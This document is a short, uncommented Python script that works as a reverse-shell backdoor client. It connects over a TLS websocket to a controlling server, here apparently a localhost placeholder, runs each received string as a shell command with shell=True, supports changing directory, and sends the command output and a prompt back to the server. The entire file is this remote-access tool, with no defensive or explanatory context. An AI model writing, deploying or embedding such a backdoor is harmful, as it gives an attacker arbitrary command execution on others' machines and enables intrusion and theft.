#!/usr/bin/env python

import asyncio
import pathlib
import ssl
import websockets
import os
import subprocess

ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
localhost_pem = pathlib.Path(__file__).with_name("cert.pem")
ssl_context.load_verify_locations(localhost_pem, "key.pem")


async def hello():
    uri = "wss://localhost:443/"
    async with websockets.connect(uri, ssl=ssl_context) as websocket:
        while True:
            data = await websocket.recv()
            if (data[:2] == 'cd'):
                os.chdir(data[3:])
            if (len(data) > 0):
                cmd = subprocess.Popen(
                    data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read()
                output_str = str(output_bytes, "utf-8")
                await websocket.send(str.encode(output_str + str(os.getcwd()) + '$'))

asyncio.get_event_loop().run_until_complete(hello())
asyncio.get_event_loop().run_forever()